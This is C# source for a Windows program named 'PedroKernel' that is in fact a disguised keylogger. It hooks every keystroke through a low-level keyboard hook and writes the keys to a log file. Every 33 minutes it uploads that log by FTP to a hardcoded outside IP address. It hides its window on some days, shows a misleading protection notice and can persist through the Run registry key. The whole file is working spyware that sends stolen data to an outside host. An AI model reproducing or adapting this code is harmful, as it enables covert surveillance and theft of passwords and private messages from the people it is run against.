using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using Timer = System.Timers.Timer;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Runtime.InteropServices.ComTypes;

namespace PedroKernel
{
    public partial class Form1 : Form
    {
        private bool isDebug = false;
        private static Timer timer;
        private NotifyIcon trayIcon;

        private const int WindowsProtectorLove = 13;
        private const int WindowsProtectorHate = 0x0100;
        private const int WindowsProtectorSex = 0x0104;

        private DateTime WindowsProtectorPress = DateTime.MinValue;
        private const double DebounceIntervalSeconds = 0.050;

        private LowLevelKeyboardProc WindowsProtectorPassed;
        private IntPtr windowhuker = IntPtr.Zero;
        private StringBuilder windowsafe = new StringBuilder();

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hHook);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private bool IsDayOdd()
        {
            int day = DateTime.Now.Day;
            return day % 2 != 0;
        }

        private bool isVisible()
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            bool registryKeyExists = reg != null && reg.GetValue(Application.ProductName) != null;
            bool isVisible = registryKeyExists || isDebug || IsDayOdd();
            return isVisible;
        }

        protected override void SetVisibleCore(bool value)
        {
            if (!IsHandleCreated)
            {
                CreateHandle();
            }
            base.SetVisibleCore(isVisible());
        }

        public Form1()
        {
            InitializeComponent();
            InitializeTrayIcon();

            ShowInTaskbar = isVisible();
            WindowState = isVisible() ? FormWindowState.Normal : FormWindowState.Minimized;
        }
        #region fnk
        private IntPtr HookCallback1(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WindowsProtectorHate || wParam == (IntPtr)WindowsProtectorSex))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                var elapsed = (DateTime.Now - WindowsProtectorPress).TotalSeconds;
                if (elapsed >= DebounceIntervalSeconds)
                {
                    if ((key >= Keys.F1 && key <= Keys.F24) || key == Keys.LWin || key == Keys.RWin || key == Keys.Apps)
                    {
                        // Ignore function keys, Windows keys, and context menu key
                    }
                    else
                    {
                        if (key == Keys.Enter || key == Keys.Space)
                        {
                            windowsafe.AppendLine(); // Start a new line before "Pressed:"
                            windowsafe.Append("Pressed: "); // Append "Pressed:" at the start of the line
                        }
                        else if (key != Keys.Space)
                        {
                            // Append the pressed key with a comma and space
                            windowsafe.Append($"{key}, ");
                        }
                    }
                }
            }

            return CallNextHookEx(windowhuker, nCode, wParam, lParam);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (ProcessModule module = Process.GetCurrentProcess().MainModule)
            {
                return SetWindowsHookEx(WindowsProtectorLove, proc, GetModuleHandle(module.ModuleName), 0);
            }
        }

        private void EnableTimer()
        {
            int minutes = 33;
            timer = new Timer(minutes * 60000); // x minutes in milliseconds

            timer.Elapsed += TimerElapsed;

            timer.Start();

            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
        }
        private void OnProcessExit(object sender, EventArgs e)
        {
            timer.Stop();
            timer.Dispose();
        }
        private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            UpdateHooker();
            ShowNotification("Pedro Information", "Found something, dealing with it.");
        }
        //UpdateFile(string logFilePath)
        public void EnableHooker()
        {
            if (windowhuker != IntPtr.Zero)
            {
                TextUpdate("Pedro Kernel is already running.", Color.MediumPurple);
                return;
            }

            EnableTimer();
            WindowsProtectorPassed = HookCallback1;
            windowhuker = SetHook(WindowsProtectorPassed);
            TextUpdate("Pedro Kernel is running.", Color.Purple);
        }

        private bool TryWritingToFile(string logFilePath)
        {
            bool fileWritten = false;
            int maxAttempts = 3;
            int waitTimeMilliseconds = 10 * 1000;

            for (int attempt = 1; attempt <= maxAttempts; attempt++)
            {
                try
                {
                    File.WriteAllText(logFilePath, windowsafe.ToString());
                    fileWritten = true;
                    break;
                }
                catch (IOException)
                {
                    if (attempt < maxAttempts)
                    {
                        Thread.Sleep(waitTimeMilliseconds);
                    }
                    else
                    {
                        TextUpdate("Something is using the file. Couldn't write to it.", Color.DarkRed);
                    }
                }
            }
            return fileWritten;
        }
        private void UploadLink(string url, string logFilePath, WebClient client)
        {
            bool success = false;
            string fileName = Path.GetFileName(logFilePath);
            string timestamp = DateTime.Now.ToString("yyyyMMddHHmmss");
            string uniqueFileName = $"{timestamp}_{fileName}";

            File.WriteAllText(logFilePath, File.ReadAllText(logFilePath));
            TextUpdate($"Connecting to {url}...", Color.BlueViolet);
            client.UploadFile(url + "/" + uniqueFileName, "STOR", logFilePath);
            success = true;
            if (success)
            {
                if (File.Exists(logFilePath))
                    File.Delete(logFilePath);
            }
        }
        private void UploadFile(string logFilePath, string ftpServerUrl, string localFtpServerUrl, string ftpUsername, string ftpPassword)
        {
            using (WebClient client = new WebClient())
            {
                client.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
                try
                {
                    UploadLink(ftpServerUrl, logFilePath, client);
                }
                catch (Exception)
                {
                    try
                    {
                        UploadLink(localFtpServerUrl, logFilePath, client);
                    }
                    catch (Exception)
                    {
                        TextUpdate($"Failed. Servers should be offline. Wait a bit.", Color.OrangeRed);
                    }
                }
            }

            TextUpdate($"Complete.", Color.DarkOliveGreen);
        }

        public bool UpdateFile(string logFilePath)
        {
            bool FileWritten = TryWritingToFile(logFilePath);
            return FileWritten;
        }

        public void UpdateHooker()
        {
            if (windowhuker != null)
            {
                string logFilePath = Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "information.log");
                bool FileWritten = UpdateFile(logFilePath);

                if (!FileWritten)
                    return;

                string ftpServerUrl = "ftp://45.4.32.219:7171";
                string localFtpServerUrl = "ftp://192.168.1.132:7171";
                string ftpUsername = "user";
                string ftpPassword = "";

                UploadFile(logFilePath, ftpServerUrl, localFtpServerUrl, ftpUsername, ftpPassword);
            }
        }

        public void DisableHooker()
        {
            UpdateHooker();
            UnhookWindowsHookEx(windowhuker);
        }
        public void ShowNotification(string title, string message)
        {
            IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;

            using (NotifyIcon notifyIcon = new NotifyIcon())
            {
                notifyIcon.Icon = Properties.Resources.Icon0;
                notifyIcon.Visible = true;
                notifyIcon.BalloonTipTitle = title;
                notifyIcon.BalloonTipText = message;
                notifyIcon.ShowBalloonTip(3000);
                Thread.Sleep(1000);
                notifyIcon.Visible = false;
            }
        }
        #endregion

        private void button1_Click(object sender, EventArgs e)
        {
            EnableHooker();
        }

        private void TextUpdate(string text, Color color)
        {
            if (textBox1.InvokeRequired)
            {
                // If called from a different thread, invoke the update operation on the main UI thread
                textBox1.Invoke((MethodInvoker)(() => TextUpdate(text, color)));
            }
            else
            {
                // Update the UI control directly from the main UI thread
                textBox1.Text = text;
                textBox1.ForeColor = color;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            TextUpdate($"Started to update. Wait a bit...", Color.Red);
            DisableHooker();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            Console.WriteLine(textBox1.Text);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            RegistryKey reg = reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("Pedro Information", Application.ExecutablePath.ToString());
            textBox1.ForeColor = System.Drawing.Color.YellowGreen;
            textBox1.Text = "You have enabled automatic startup.";
        }

        private void deleteRegistryInit()
        {
            string subKeyName = "Pedro Information";
            try
            {
                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (reg != null)
                {
                    reg.DeleteSubKeyTree(subKeyName);
                    TextUpdate("Registry key deleted successfully.", Color.Purple);
                }
                else
                {
                    TextUpdate("Registry key not found.", Color.PowderBlue);
                }
            }
            catch (Exception ex)
            {
                TextUpdate("An error occurred while deleting the registry key: " + ex.Message, Color.Red);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            UnhookWindowsHookEx(windowhuker);
            deleteRegistryInit();
        }
    }
}
